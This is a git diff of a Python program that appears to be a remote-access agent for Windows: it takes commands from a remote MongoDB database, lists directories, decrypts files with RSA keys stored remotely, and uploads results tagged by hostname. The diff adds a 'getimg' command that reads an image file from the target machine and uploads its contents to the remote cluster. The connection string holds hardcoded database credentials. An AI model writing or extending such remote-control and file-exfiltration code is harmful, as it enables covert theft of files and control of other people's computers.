@@ -4,8 +4,9 @@ import rsa
 import socket
 import win32api
 from pymongo import MongoClient
-
-
+import cv2
+import glob
+import numpy as np
 
 con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"
 
@@ -32,6 +33,11 @@ def upload(data):
     clearPrevData()
     upload_col.insert_one(data)
 
+
+def imageReader(path,file):
+    images = ([cv2.imread(file) for file in glob.glob(f'{path}/{file}')])
+    a=np.array(images[0])
+    return a.tolist()
 
 def action_on_system(new_path="",command="",original_filename="",update_str="",new_foldername="",new_filename="",path=""):
 	if command=='dir':
@@ -195,6 +201,13 @@ def action_take(listen):
         if x:
             col.delete_one(filters)
         decrypt(private_key=(str_to_byte(x['key'])),paths=cwd,file=target_element)
+    elif action=='getimg':
+        target_element=listen['target_element']
+        data={
+            "hostname":hostname,
+            "result":imageReader(path=cwd,file=target_element)
+        }
+        upload(data)
 
 
 def executes():
